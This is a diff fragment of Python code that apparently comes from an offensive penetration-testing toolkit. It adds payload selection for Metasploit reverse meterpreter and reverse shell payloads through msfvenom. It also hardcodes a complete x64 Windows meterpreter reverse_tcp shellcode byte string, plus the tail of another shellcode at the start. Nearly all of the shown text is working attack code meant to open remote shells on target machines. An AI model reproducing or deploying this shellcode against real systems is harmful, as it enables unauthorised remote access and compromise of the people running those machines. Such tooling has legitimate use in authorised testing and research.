56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3"
+
+    # reverse https requires generation through msfvenom
+    if payload == "windows/meterpreter/reverse_https":
+        print_status("Reverse_HTTPS takes a few seconds to calculate..One moment..")
+        shellcode = generate_shellcode(payload, ipaddr, port)
+
+    # reverse http requires generation through msfvenom
+    if payload == "windows/meterpreter/reverse_http":
+        print_status("Reverse_HTTP takes a few seconds to calculate..One moment..")
+        shellcode = generate_shellcode(payload, ipaddr, port)
+
+    # allports requires generation through msfvenom
+    if payload == "windows/meterpreter/reverse_tcp_allports":
+        print_status("Reverse TCP Allports takes a few seconds to calculate..One moment..")
+        shellcode = generate_shellcode(payload, ipaddr, port)
+
+    # reverse tcp needs to be rewritten for shellcode, will do later
+    if payload == "windows/shell/reverse_tcp":
+        print_status("Reverse Shell takes a few seconds to calculate..One moment..")
+        shellcode = generate_shellcode(payload, ipaddr, port)
+
+    # reverse meterpreter tcp
+    if payload == "windows/x64/meterpreter/reverse_tcp":
+        shellcode = r"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xff\xfe\xfd\xfc\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41\xff\xe7"
+
+    shellcode = re.sub("\\\\x", "0x", shellcode)
+
+    return shellcode
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
